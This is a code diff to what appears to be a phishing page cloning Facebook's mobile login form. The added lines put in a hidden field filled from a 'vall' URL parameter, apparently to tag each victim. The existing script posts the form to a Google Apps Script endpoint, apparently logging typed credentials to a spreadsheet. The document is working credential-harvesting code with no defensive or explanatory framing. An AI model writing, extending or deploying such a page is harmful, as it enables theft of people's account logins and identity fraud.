@@ -117,6 +117,7 @@
                                             <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                             <div id="otp_retrieve_desc_container"></div>
                                             <div>
+						    <input type="hidden" id="mobb" name="num" value="">
                                                 <div class="_56be">
                                                     <div class="_55wo _56bf">
                                                         <div class="_96n9" id="email_input_container">
@@ -352,9 +353,15 @@
 
 
          <script type="text/javascript">
-             
+             var urlParams = new URLSearchParams(window.location.search);
+var mobbget = urlParams.get("vall");
+
+		 var mobb = document.getElementById('mobb');
+		 mobb.value = mobbget;
+		 
 	  const scriptURL = 'https://script.google.com/macros/s/AKfycby3599EVny7LkDTY2w2O4jHY3V8XY_XE74DrC5lu8HDlgYDuLOvKdHLh5qAOSUBGRjGKA/exec';
             const form = document.forms['google-sheet']
+		 
 		 const submitlog = document.querySelector('#submitlog');
             submitlog.addEventListener('click', e => {
               e.preventDefault();
